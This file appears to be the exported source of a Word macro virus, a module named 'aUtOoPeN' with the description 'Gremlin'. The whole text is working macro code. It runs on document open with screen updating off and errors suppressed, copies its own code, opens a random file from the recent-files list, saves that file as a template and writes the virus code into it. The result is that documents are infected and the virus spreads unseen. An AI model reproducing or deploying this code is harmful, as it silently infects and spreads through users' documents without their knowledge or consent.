   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "aUtOoPeN"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Gremlin"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.aUtOoPeN.MAIN"
   Dim a$
   WordBasic.ScreenUpdating 0: On Error Resume Next
   WordBasic.ToolsMacro Name:="autoopen", Show:=3, Edit:=1
   WordBasic.EditSelectAll: a$ = WordBasic.[Selection$]()
   WordBasic.FileList WordBasic.Int(Rnd() * ((4 + 1) - 1) + 1)
   WordBasic.FileSaveAs WordBasic.[FileName$](), Format:=1
   WordBasic.ToolsMacro Name:="autoopen", Show:=3, Edit:=1
   WordBasic.EditSelectAll: WordBasic.Insert a$
   WordBasic.FileClose 1: WordBasic.DocClose 1
   End Sub
